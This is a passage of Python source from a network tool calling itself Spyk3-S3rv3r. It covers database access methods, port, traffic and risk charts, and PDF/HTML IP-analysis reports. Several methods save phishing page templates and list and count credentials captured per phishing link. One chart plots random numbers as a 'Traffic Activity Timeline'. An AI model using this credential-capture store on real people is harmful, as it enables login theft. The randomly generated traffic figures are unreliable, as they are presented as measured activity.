    def get_captured_credentials(self, link_id: Optional[str] = None) -> List[Dict]:
        """Get captured credentials"""
        try:
            if link_id:
                self.cursor.execute('''
                    SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC
                ''', (link_id,))
            else:
                self.cursor.execute('''
                    SELECT * FROM captured_credentials ORDER BY timestamp DESC
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get captured credentials: {e}")
            return []
    
    def get_phishing_templates(self, platform: Optional[str] = None) -> List[Dict]:
        """Get phishing templates"""
        try:
            if platform:
                self.cursor.execute('''
                    SELECT * FROM phishing_templates WHERE platform = ? ORDER BY name
                ''', (platform,))
            else:
                self.cursor.execute('''
                    SELECT * FROM phishing_templates ORDER BY platform, name
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get phishing templates: {e}")
            return []
    
    def save_phishing_template(self, name: str, platform: str, html_content: str) -> bool:
        """Save phishing template"""
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO phishing_templates (name, platform, html_content)
                VALUES (?, ?, ?)
            ''', (name, platform, html_content))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save phishing template: {e}")
            return False
    
    # ==================== Statistics Methods ====================
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        """Get recent threats"""
        try:
            self.cursor.execute('''
                SELECT * FROM threats ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get threats: {e}")
            return []
    
    def get_threats_by_ip(self, ip: str, limit: int = 10) -> List[Dict]:
        """Get threats for specific IP"""
        try:
            self.cursor.execute('''
                SELECT * FROM threats 
                WHERE source_ip = ? 
                ORDER BY timestamp DESC LIMIT ?
            ''', (ip, limit))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get threats by IP: {e}")
            return []
    
    def get_traffic_logs(self, limit: int = 20) -> List[Dict]:
        """Get recent traffic generation logs"""
        try:
            self.cursor.execute('''
                SELECT * FROM traffic_logs ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get traffic logs: {e}")
            return []
    
    def get_nikto_scans(self, limit: int = 10) -> List[Dict]:
        """Get recent Nikto scans"""
        try:
            self.cursor.execute('''
                SELECT * FROM nikto_scans ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get Nikto scans: {e}")
            return []
    
    def get_command_history(self, limit: int = 20) -> List[Dict]:
        """Get command history"""
        try:
            self.cursor.execute('''
                SELECT command, source, timestamp, success FROM command_history 
                ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get command history: {e}")
            return []
    
    def get_time_history(self, limit: int = 20) -> List[Dict]:
        """Get time/date command history"""
        try:
            self.cursor.execute('''
                SELECT command, user, result, timestamp FROM time_history 
                ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get time history: {e}")
            return []
    
    def get_user_sessions(self, active_only: bool = True) -> List[Dict]:
        """Get user sessions"""
        try:
            if active_only:
                self.cursor.execute('''
                    SELECT * FROM user_sessions WHERE active = 1 ORDER BY start_time DESC
                ''')
            else:
                self.cursor.execute('''
                    SELECT * FROM user_sessions ORDER BY start_time DESC
                ''')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get sessions: {e}")
            return []
    
    def get_statistics(self) -> Dict:
        """Get database statistics"""
        stats = {}
        try:
            self.cursor.execute('SELECT COUNT(*) FROM threats')
            stats['total_threats'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM command_history')
            stats['total_commands'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM time_history')
            stats['total_time_commands'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM scans')
            stats['total_scans'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM nikto_scans')
            stats['total_nikto_scans'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM ssh_servers')
            stats['total_ssh_servers'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM ssh_commands')
            stats['total_ssh_commands'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM managed_ips')
            stats['total_managed_ips'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1')
            stats['total_blocked_ips'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM traffic_logs')
            stats['total_traffic_tests'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM phishing_links WHERE active = 1')
            stats['active_phishing_links'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM captured_credentials')
            stats['captured_credentials'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM user_sessions WHERE active = 1')
            stats['active_sessions'] = self.cursor.fetchone()[0]
            
            self.cursor.execute('SELECT COUNT(*) FROM ip_analysis')
            stats['total_ip_analyses'] = self.cursor.fetchone()[0]
            
        except Exception as e:
            logger.error(f"Failed to get statistics: {e}")
        
        return stats
    
    def create_session(self, user_name: str = None) -> str:
        """Create new user session"""
        try:
            session_id = str(uuid.uuid4())[:8]
            self.cursor.execute('''
                INSERT INTO user_sessions (session_id, user_name)
                VALUES (?, ?)
            ''', (session_id, user_name))
            self.conn.commit()
            return session_id
        except Exception as e:
            logger.error(f"Failed to create session: {e}")
            return None
    
    def update_session_activity(self, session_id: str):
        """Update session activity"""
        try:
            self.cursor.execute('''
                UPDATE user_sessions 
                SET last_activity = CURRENT_TIMESTAMP, 
                    commands_count = commands_count + 1
                WHERE session_id = ? AND active = 1
            ''', (session_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update session: {e}")
    
    def end_session(self, session_id: str):
        """End user session"""
        try:
            self.cursor.execute('''
                UPDATE user_sessions 
                SET active = 0, last_activity = CURRENT_TIMESTAMP
                WHERE session_id = ?
            ''', (session_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to end session: {e}")
    
    def update_platform_status(self, platform: str, enabled: bool, status: str, error: str = None):
        """Update platform integration status"""
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO platform_status (platform, enabled, last_connected, status, error)
                VALUES (?, ?, CURRENT_TIMESTAMP, ?, ?)
            ''', (platform, enabled, status, error))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update platform status: {e}")
    
    def get_platform_status(self) -> List[Dict]:
        """Get all platform statuses"""
        try:
            self.cursor.execute('SELECT * FROM platform_status')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get platform status: {e}")
            return []
    
    def close(self):
        """Close database connection"""
        try:
            if self.conn:
                self.conn.close()
        except Exception as e:
            logger.error(f"Error closing database: {e}")

# =====================
# GRAPHICS GENERATOR
# =====================
class GraphicsGenerator:
    """Generate statistical graphics for IP analysis"""
    
    def __init__(self, output_dir: str = GRAPHICS_DIR):
        self.output_dir = output_dir
        Path(output_dir).mkdir(exist_ok=True)
        
        if GRAPHICS_AVAILABLE:
            plt.style.use('seaborn-v0_8-darkgrid')
            sns.set_palette("husl")
    
    def generate_port_statistics(self, port_data: List[Dict], target_ip: str, timestamp: str) -> Dict[str, str]:
        """Generate port statistics graphics"""
        if not GRAPHICS_AVAILABLE:
            return {}
            
        graphics_files = {}
        
        open_ports = []
        common_services = []
        
        for port_info in port_data:
            port = port_info.get('port', 0)
            state = port_info.get('state', 'unknown')
            service = port_info.get('service', 'unknown')
            
            if state == 'open':
                open_ports.append(int(port))
                if service != 'unknown':
                    common_services.append(service)
        
        fig, axes = plt.subplots(2, 2, figsize=(16, 12))
        fig.suptitle(f'Port Analysis Statistics - {target_ip}\n{timestamp}', fontsize=16, fontweight='bold')
        
        ax1 = axes[0, 0]
        if open_ports:
            open_ports.sort()
            port_labels = [str(p) for p in open_ports[:15]]
            port_values = [1] * len(port_labels)
            
            bars = ax1.bar(range(len(port_labels)), port_values, color='#ff6b6b')
            ax1.set_xticks(range(len(port_labels)))
            ax1.set_xticklabels(port_labels, rotation=45, ha='right')
            ax1.set_title(f'Open Ports (First {len(port_labels)})', fontsize=14, fontweight='bold')
            ax1.set_ylabel('Count')
            ax1.set_xlabel('Port Number')
        else:
            ax1.text(0.5, 0.5, 'No Open Ports Detected', ha='center', va='center', fontsize=12)
            ax1.set_title('Open Ports', fontsize=14, fontweight='bold')
        
        ax2 = axes[0, 1]
        if common_services:
            service_counts = Counter(common_services)
            services = list(service_counts.keys())[:10]
            counts = list(service_counts.values())[:10]
            
            bars = ax2.barh(range(len(services)), counts, color='#45b7d1')
            ax2.set_yticks(range(len(services)))
            ax2.set_yticklabels(services)
            ax2.set_title('Common Services Detected', fontsize=14, fontweight='bold')
            ax2.set_xlabel('Frequency')
        else:
            ax2.text(0.5, 0.5, 'No Common Services Detected', ha='center', va='center', fontsize=12)
            ax2.set_title('Common Services', fontsize=14, fontweight='bold')
        
        ax3 = axes[1, 0]
        if open_ports:
            port_ranges = {
                'Well-known (0-1023)': len([p for p in open_ports if p <= 1023]),
                'Registered (1024-49151)': len([p for p in open_ports if 1024 <= p <= 49151]),
                'Dynamic (49152-65535)': len([p for p in open_ports if p >= 49152])
            }
            
            ranges = list(port_ranges.keys())
            values = list(port_ranges.values())
            colors = ['#ff9999', '#66b3ff', '#99ff99']
            
            wedges, texts, autotexts = ax3.pie(
                values,
                labels=ranges,
                autopct='%1.1f%%',
                colors=colors,
                startangle=90,
                explode=(0.05, 0.05, 0.05)
            )
            ax3.set_title('Port Range Distribution', fontsize=14, fontweight='bold')
        else:
            ax3.text(0.5, 0.5, 'No Port Data Available', ha='center', va='center', fontsize=12)
            ax3.set_title('Port Range Distribution', fontsize=14, fontweight='bold')
        
        ax4 = axes[1, 1]
        ax4.text(0.5, 0.5, f'Total Open Ports: {len(open_ports)}', 
                ha='center', va='center', fontsize=14, fontweight='bold')
        ax4.set_title('Summary', fontsize=14, fontweight='bold')
        ax4.axis('off')
        
        plt.tight_layout()
        
        safe_timestamp = timestamp.replace(':', '-').replace(' ', '_')
        port_graphic = os.path.join(self.output_dir, f'port_stats_{target_ip}_{safe_timestamp}.png')
        plt.savefig(port_graphic, dpi=300, bbox_inches='tight')
        graphics_files['port_statistics'] = port_graphic
        plt.close()
        
        return graphics_files
    
    def generate_traffic_statistics(self, traffic_data: Dict, target_ip: str, timestamp: str) -> Dict[str, str]:
        """Generate traffic monitoring statistics graphics"""
        if not GRAPHICS_AVAILABLE:
            return {}
            
        graphics_files = {}
        
        fig, axes = plt.subplots(2, 2, figsize=(16, 12))
        fig.suptitle(f'Traffic Analysis Statistics - {target_ip}\n{timestamp}', fontsize=16, fontweight='bold')
        
        ax1 = axes[0, 0]
        threat_level = traffic_data.get('threat_level', 'low')
        connection_count = traffic_data.get('connection_count', 0)
        
        levels = {'low': 0.3, 'medium': 0.6, 'high': 0.9}
        level_value = levels.get(threat_level, 0.3)
        
        colors = ['#ff6b6b' if threat_level == 'high' else '#ffd93d' if threat_level == 'medium' else '#6bcf7f']
        ax1.bar(['Threat Level'], [level_value * 100], color=colors)
        ax1.set_ylim(0, 100)
        ax1.set_ylabel('Level %')
        ax1.set_title(f'Traffic Threat Level: {threat_level.upper()}\n({connection_count} connections)', 
                     fontsize=14, fontweight='bold')
        
        ax2 = axes[0, 1]
        connections = traffic_data.get('connections', [])
        
        if connections:
            protocols = [conn.get('protocol', 'unknown') for conn in connections]
            protocol_counts = Counter(protocols)
            
            protocols_list = list(protocol_counts.keys())
            counts = list(protocol_counts.values())
            
            bars = ax2.bar(range(len(protocols_list)), counts, color=['#45b7d1', '#96ceb4', '#ffcc5c'])
            ax2.set_xticks(range(len(protocols_list)))
            ax2.set_xticklabels(protocols_list)
            ax2.set_title('Connection Protocols', fontsize=14, fontweight='bold')
            ax2.set_xlabel('Protocol')
            ax2.set_ylabel('Count')
        else:
            ax2.text(0.5, 0.5, 'No Traffic Data Available', ha='center', va='center', fontsize=12)
            ax2.set_title('Connection Protocols', fontsize=14, fontweight='bold')
        
        ax3 = axes[1, 0]
        timeline_points = 20
        time_points = list(range(timeline_points))
        simulated_traffic = np.random.randint(0, connection_count + 5, timeline_points)
        
        ax3.plot(time_points, simulated_traffic, marker='o', linestyle='-', color='#ff6b6b', linewidth=2, markersize=6)
        ax3.fill_between(time_points, simulated_traffic, alpha=0.3, color='#ff6b6b')
        ax3.set_title('Traffic Activity Timeline', fontsize=14, fontweight='bold')
        ax3.set_xlabel('Time Interval')
        ax3.set_ylabel('Connection Count')
        ax3.grid(True, alpha=0.3)
        
        ax4 = axes[1, 1]
        ax4.text(0.5, 0.5, f'Total Connections: {connection_count}\nThreat Level: {threat_level.upper()}', 
                ha='center', va='center', fontsize=14, fontweight='bold')
        ax4.set_title('Summary', fontsize=14, fontweight='bold')
        ax4.axis('off')
        
        plt.tight_layout()
        
        safe_timestamp = timestamp.replace(':', '-').replace(' ', '_')
        traffic_graphic = os.path.join(self.output_dir, f'traffic_stats_{target_ip}_{safe_timestamp}.png')
        plt.savefig(traffic_graphic, dpi=300, bbox_inches='tight')
        graphics_files['traffic_statistics'] = traffic_graphic
        plt.close()
        
        return graphics_files
    
    def generate_security_statistics(self, security_data: Dict, target_ip: str, timestamp: str) -> Dict[str, str]:
        """Generate security assessment statistics graphics"""
        if not GRAPHICS_AVAILABLE:
            return {}
            
        graphics_files = {}
        
        fig, axes = plt.subplots(2, 2, figsize=(16, 12))
        fig.suptitle(f'Security Assessment Statistics - {target_ip}\n{timestamp}', fontsize=16, fontweight='bold')
        
        ax1 = axes[0, 0]
        risk_score = security_data.get('risk_score', 0)
        risk_level = security_data.get('risk_level', 'low')
        
        colors = ['#ff6b6b' if risk_score >= 70 else '#ffd93d' if risk_score >= 40 else '#6bcf7f']
        ax1.bar(['Risk Score'], [risk_score], color=colors)
        ax1.set_ylim(0, 100)
        ax1.set_ylabel('Score')
        ax1.set_title(f'Risk Score: {risk_score}\nLevel: {risk_level.upper()}', fontsize=14, fontweight='bold')
        
        ax2 = axes[0, 1]
        threats = security_data.get('threats_detected', [])
        
        if threats:
            threat_categories = {
                'Port Related': len([t for t in threats if 'port' in t.lower()]),
                'Traffic Related': len([t for t in threats if 'traffic' in t.lower()]),
                'Security Related': len([t for t in threats if 'blocked' in t.lower() or 'risk' in t.lower()])
            }
            
            categories = list(threat_categories.keys())
            counts = list(threat_categories.values())
            
            bars = ax2.bar(range(len(categories)), counts, color=['#ff6b6b', '#45b7d1', '#ffd93d'])
            ax2.set_xticks(range(len(categories)))
            ax2.set_xticklabels(categories, rotation=45, ha='right')
            ax2.set_title('Threat Categories', fontsize=14, fontweight='bold')
            ax2.set_ylabel('Number of Threats')
        else:
            ax2.text(0.5, 0.5, 'No Threats Detected', ha='center', va='center', fontsize=12)
            ax2.set_title('Threats Detected', fontsize=14, fontweight='bold')
        
        ax3 = axes[1, 0]
        metrics = {
            'Open Ports': len(security_data.get('open_ports', [])),
            'Sensitive Ports': len([p for p in security_data.get('open_ports', []) if p in [21,22,23,3389,5900]]),
            'Blocked': 1 if security_data.get('is_blocked', False) else 0
        }
        
        metrics_names = list(metrics.keys())
        metrics_values = list(metrics.values())
        
        bars = ax3.barh(range(len(metrics_names)), metrics_values, color=['#ff6b6b', '#ffd93d', '#45b7d1'])
        ax3.set_yticks(range(len(metrics_names)))
        ax3.set_yticklabels(metrics_names)
        ax3.set_title('Security Metrics', fontsize=14, fontweight='bold')
        ax3.set_xlabel('Count')
        
        ax4 = axes[1, 1]
        summary_text = f"Risk Score: {risk_score}\nRisk Level: {risk_level.upper()}\n"
        summary_text += f"Threats: {len(threats)}\n"
        summary_text += f"Blocked: {'Yes' if security_data.get('is_blocked') else 'No'}"
        
        ax4.text(0.5, 0.5, summary_text, ha='center', va='center', fontsize=14, fontweight='bold')
        ax4.set_title('Summary', fontsize=14, fontweight='bold')
        ax4.axis('off')
        
        plt.tight_layout()
        
        safe_timestamp = timestamp.replace(':', '-').replace(' ', '_')
        security_graphic = os.path.join(self.output_dir, f'security_stats_{target_ip}_{safe_timestamp}.png')
        plt.savefig(security_graphic, dpi=300, bbox_inches='tight')
        graphics_files['security_statistics'] = security_graphic
        plt.close()
        
        return graphics_files
    
    def generate_comprehensive_statistics(self, analysis_result: 'IPAnalysisResult') -> Dict[str, str]:
        """Generate comprehensive statistics graphics for all aspects"""
        if not GRAPHICS_AVAILABLE:
            return {}
            
        graphics_files = {}
        
        target_ip = analysis_result.target_ip
        timestamp = analysis_result.timestamp.replace(':', '-').replace(' ', '_')
        
        port_graphics = self.generate_port_statistics(
            analysis_result.port_scan_result.get('open_ports', []),
            target_ip,
            timestamp
        )
        graphics_files.update(port_graphics)
        
        traffic_graphics = self.generate_traffic_statistics(
            analysis_result.traffic_monitor_result,
            target_ip,
            timestamp
        )
        graphics_files.update(traffic_graphics)
        
        security_graphics = self.generate_security_statistics(
            analysis_result.security_status,
            target_ip,
            timestamp
        )
        graphics_files.update(security_graphics)
        
        return graphics_files

# =====================
# REPORT GENERATOR
# =====================
class ReportGenerator:
    """Generate comprehensive reports with graphics"""
    
    def __init__(self, output_dir: str = REPORT_DIR):
        self.output_dir = output_dir
        Path(output_dir).mkdir(exist_ok=True)
        self.graphics_gen = GraphicsGenerator()
    
    def generate_pdf_report(self, analysis_result: 'IPAnalysisResult', graphics_files: Dict[str, str] = None) -> str:
        """Generate PDF report with graphics"""
        if not PDF_AVAILABLE:
            return ""
            
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        report_filename = os.path.join(self.output_dir, f"IP_Analysis_{analysis_result.target_ip}_{timestamp}.pdf")
        
        doc = SimpleDocTemplate(
            report_filename,
            pagesize=A4,
            rightMargin=72,
            leftMargin=72,
            topMargin=72,
            bottomMargin=72
        )
        
        styles = getSampleStyleSheet()
        title_style = ParagraphStyle(
            'CustomTitle',
            parent=styles['Heading1'],
            fontSize=24,
            textColor=colors.HexColor('#2c3e50'),
            alignment=TA_CENTER,
            spaceAfter=30
        )
        
        heading_style = ParagraphStyle(
            'CustomHeading',
            parent=styles['Heading2'],
            fontSize=16,
            textColor=colors.HexColor('#34495e'),
            spaceAfter=12,
            spaceBefore=20
        )
        
        normal_style = styles['Normal']
        normal_style.fontSize = 10
        
        story = []
        
        story.append(Paragraph("SPYK3-S3RV3R IP ANALYSIS REPORT", title_style))
        story.append(Paragraph(f"Target: {analysis_result.target_ip}", heading_style))
        story.append(Paragraph(f"Analysis Time: {analysis_result.timestamp[:19]}", normal_style))
        story.append(Spacer(1, 20))
        
        story.append(Paragraph("EXECUTIVE SUMMARY", heading_style))
        
        risk_level = analysis_result.security_status.get('risk_level', 'unknown').upper()
        risk_color = 'red' if risk_level in ['CRITICAL', 'HIGH'] else 'orange' if risk_level == 'MEDIUM' else 'green'
        
        summary_text = f"""
        This report presents a comprehensive analysis of IP address <b>{analysis_result.target_ip}</b>.
        The security risk level is <font color="{risk_color}"><b>{risk_level}</b></font> with a risk score of 
        <b>{analysis_result.security_status.get('risk_score', 0)}</b>.
        """
        story.append(Paragraph(summary_text, normal_style))
        story.append(Spacer(1, 12))
        
        story.append(Paragraph("KEY FINDINGS", heading_style))
        
        findings = []
        ping_result = analysis_result.ping_result
        findings.append(f"• Ping Status: {'Online' if ping_result.get('success') else 'Offline'}")
        
        if ping_result.get('avg_rtt'):
            findings.append(f"• Average Latency: {ping_result.get('avg_rtt')}ms")
        
        geo = analysis_result.geolocation_result
        findings.append(f"• Location: {geo.get('country', 'Unknown')}, {geo.get('city', 'Unknown')}")
        findings.append(f"• ISP: {geo.get('isp', 'Unknown')}")
        
        ports = analysis_result.port_scan_result.get('open_ports', [])
        findings.append(f"• Open Ports: {len(ports)}")
        
        traffic = analysis_result.traffic_monitor_result
        findings.append(f"• Traffic Level: {traffic.get('threat_level', 'low').upper()}")
        findings.append(f"• Active Connections: {traffic.get('connection_count', 0)}")
        
        for finding in findings:
            story.append(Paragraph(finding, normal_style))
        
        story.append(Spacer(1, 20))
        
        if graphics_files:
            story.append(Paragraph("STATISTICAL VISUALIZATIONS", heading_style))
            
            for graphic_type, graphic_path in graphics_files.items():
                if os.path.exists(graphic_path):
                    title = graphic_type.replace('_', ' ').title()
                    story.append(Paragraph(title, styles['Heading3']))
                    story.append(Spacer(1, 10))
                    
                    img = Image(graphic_path, width=6*inch, height=4.5*inch)
                    story.append(img)
                    story.append(Spacer(1, 15))
        
        story.append(PageBreak())
        
        story.append(Paragraph("DETAILED ANALYSIS", heading_style))
        
        story.append(Paragraph("1. Ping Analysis", styles['Heading3']))
        ping_table_data = [
            ['Metric', 'Value'],
            ['Status', 'Online' if ping_result.get('success') else 'Offline'],
            ['Average RTT', f"{ping_result.get('avg_rtt', 'N/A')}ms"],
            ['Packet Loss', f"{ping_result.get('packet_loss', 0)}%"]
        ]
        
        ping_table = Table(ping_table_data, colWidths=[2*inch, 3*inch])
        ping_table.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (1, 0), colors.grey),
            ('TEXTCOLOR', (0, 0), (1, 0), colors.whitesmoke),
            ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
            ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
            ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
            ('GRID', (0, 0), (-1, -1), 1, colors.black)
        ]))
        story.append(ping_table)
        story.append(Spacer(1, 15))
        
        story.append(Paragraph("2. Port Scan Results", styles['Heading3']))
        
        if ports:
            port_table_data = [['Port', 'State', 'Service']]
            for port_info in ports[:20]:
                port_table_data.append([
                    str(port_info.get('port', 'N/A')),
                    port_info.get('state', 'unknown'),
                    port_info.get('service', 'unknown')
                ])
            
            port_table = Table(port_table_data, colWidths=[1.5*inch, 1.5*inch, 2*inch])
            port_table.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
                ('GRID', (0, 0), (-1, -1), 1, colors.black)
            ]))
            story.append(port_table)
        else:
            story.append(Paragraph("No open ports detected.", normal_style))
        
        story.append(Spacer(1, 15))
        
        story.append(Paragraph("3. Geolocation", styles['Heading3']))
        geo_table_data = [
            ['Country', geo.get('country', 'Unknown')],
            ['Region', geo.get('region', 'Unknown')],
            ['City', geo.get('city', 'Unknown')],
            ['ISP', geo.get('isp', 'Unknown')]
        ]
        
        geo_table = Table(geo_table_data, colWidths=[2*inch, 3*inch])
        geo_table.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, -1), colors.beige),
            ('GRID', (0, 0), (-1, -1), 1, colors.black)
        ]))
        story.append(geo_table)
        story.append(Spacer(1, 15))
        
        story.append(Paragraph("4. Traffic Monitoring", styles['Heading3']))
        
        traffic_table_data = [
            ['Threat Level', traffic.get('threat_level', 'unknown').upper()],
            ['Connection Count', str(traffic.get('connection_count', 0))]
        ]
        
        traffic_table = Table(traffic_table_data, colWidths=[2*inch, 3*inch])
        traffic_table.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, -1), colors.beige),
            ('GRID', (0, 0), (-1, -1), 1, colors.black)
        ]))
        story.append(traffic_table)
        story.append(Spacer(1, 15))
        
        story.append(Paragraph("5. Security Assessment", styles['Heading3']))
        
        security = analysis_result.security_status
        security_table_data = [
            ['Risk Level', security.get('risk_level', 'unknown').upper()],
            ['Risk Score', str(security.get('risk_score', 0))],
            ['Blocked Status', 'Blocked' if security.get('is_blocked') else 'Not Blocked']
        ]
        
        security_table = Table(security_table_data, colWidths=[2*inch, 3*inch])
        security_table.setStyle(TableStyle([
            ('BACKGROUND', (0, 0), (-1, -1), colors.beige),
            ('GRID', (0, 0), (-1, -1), 1, colors.black)
        ]))
        story.append(security_table)
        story.append(Spacer(1, 15))
        
        if security.get('threats_detected'):
            story.append(Paragraph("Threats Detected:", styles['Heading4']))
            for threat in security['threats_detected']:
                story.append(Paragraph(f"• {threat}", normal_style))
            story.append(Spacer(1, 10))
        
        story.append(Paragraph("RECOMMENDATIONS", heading_style))
        
        if analysis_result.recommendations:
            for rec in analysis_result.recommendations:
                story.append(Paragraph(f"• {rec}", normal_style))
        else:
            story.append(Paragraph("No specific recommendations at this time.", normal_style))
        
        story.append(Spacer(1, 30))
        story.append(Paragraph(
            f"Report generated by Spyk3-S3rv3r v1.0.0 | {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            styles['Italic']
        ))
        
        doc.build(story)
        
        return report_filename
    
    def generate_html_report(self, analysis_result: 'IPAnalysisResult', graphics_files: Dict[str, str] = None) -> str:
        """Generate HTML report with graphics"""
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        report_filename = os.path.join(self.output_dir, f"IP_Analysis_{analysis_result.target_ip}_{timestamp}.html")
        
        risk_level = analysis_result.security_status.get('risk_level', 'unknown')
        risk_color = {
            'critical': '#dc3545',
            'high': '#fd7e14',
            'medium': '#ffc107',
            'low': '#28a745'
        }.get(risk_level, '#6c757d')
        
        html_content = f"""
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Spyk3-S3rv3r IP Analysis Report - {analysis_result.target_ip}</title>
            <style>
                body {{
                    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                    line-height: 1.6;
                    color: #333;
                    max-width: 1200px;
                    margin: 0 auto;
                    padding: 20px;
                    background-color: #f8f9fa;
                }}
                .header {{
                    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                    color: white;
                    padding: 30px;
                    border-radius: 10px;
                    margin-bottom: 30px;
                    text-align: center;
                }}
                .header h1 {{
                    margin: 0;
                    font-size: 2.5em;
                }}
                .section {{
                    background: white;
                    padding: 25px;
                    border-radius: 10px;
                    margin-bottom: 25px;
                    box-shadow: 0 2px 10px rgba(0,0,0,0.1);
                }}
                .section h2 {{
                    color: #495057;
                    border-bottom: 3px solid #667eea;
                    padding-bottom: 10px;
                    margin-top: 0;
                }}
                .risk-badge {{
                    display: inline-block;
                    padding: 8px 16px;
                    border-radius: 20px;
                    font-weight: bold;
                    color: white;
                    background-color: {risk_color};
                }}
                table {{
                    width: 100%;
                    border-collapse: collapse;
                    margin-top: 20px;
                }}
                th, td {{
                    padding: 12px;
                    text-align: left;
                    border-bottom: 1px solid #dee2e6;
                }}
                th {{
                    background-color: #667eea;
                    color: white;
                }}
                .graphics-container {{
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(500px, 1fr));
                    gap: 20px;
                    margin-top: 20px;
                }}
                .graphic-item {{
                    background: white;
                    padding: 15px;
                    border-radius: 8px;
                    box-shadow: 0 2px 5px rgba(0,0,0,0.1);
                }}
                .graphic-item img {{
                    max-width: 100%;
                    height: auto;
                    border-radius: 5px;
                }}
                .recommendation {{
                    background: #e7f5ff;
                    padding: 15px;
                    border-radius: 8px;
                    margin: 10px 0;
                    border-left: 4px solid #339af0;
                }}
                .footer {{
                    text-align: center;
                    margin-top: 40px;
                    padding: 20px;
                    color: #6c757d;
                }}
            </style>
        </head>
        <body>
            <div class="header">
                <h1>Spyk3-S3rv3r IP Analysis Report</h1>
                <p>Target: {analysis_result.target_ip} | Analysis Time: {analysis_result.timestamp[:19]}</p>
                <div style="margin-top: 20px;">
                    <span class="risk-badge">Risk Level: {risk_level.upper()}</span>
                </div>
            </div>
            
            <div class="section">
                <h2>Executive Summary</h2>
                <p>This comprehensive analysis of <strong>{analysis_result.target_ip}</strong> reveals a security risk level of 
                <strong style="color: {risk_color};">{risk_level.upper()}</strong> with a risk score of 
                <strong>{analysis_result.security_status.get('risk_score', 0)}</strong>.</p>
                
                <table>
                    <tr><th>Ping Status</th><td>{'Online' if analysis_result.ping_result.get('success') else 'Offline'}</td></tr>
                    <tr><th>Open Ports</th><td>{len(analysis_result.port_scan_result.get('open_ports', []))}</td></tr>
                    <tr><th>Traffic Level</th><td>{analysis_result.traffic_monitor_result.get('threat_level', 'low').upper()}</td></tr>
                    <tr><th>Active Connections</th><td>{analysis_result.traffic_monitor_result.get('connection_count', 0)}</td></tr>
                </table>
            </div>
        """
        
        if graphics_files:
            html_content += """
            <div class="section">
                <h2>Statistical Visualizations</h2>
                <div class="graphics-container">
            """
            
            for graphic_type, graphic_path in graphics_files.items():
                if os.path.exists(graphic_path):
                    rel_path = os.path.relpath(graphic_path, self.output_dir)
                    title = graphic_type.replace('_', ' ').title()
                    html_content += f"""
                    <div class="graphic-item">
                        <h3>{title}</h3>
                        <img src="{rel_path}" alt="{title}">
                    </div>
                    """
            
            html_content += """
                </div>
            </div>
            """
        
        html_content += f"""
            <div class="section">
                <h2>Detailed Analysis</h2>
                
                <h3>Geolocation</h3>
                <table>
                    <tr><th>Country</th><td>{analysis_result.geolocation_result.get('country', 'Unknown')}</td></tr>
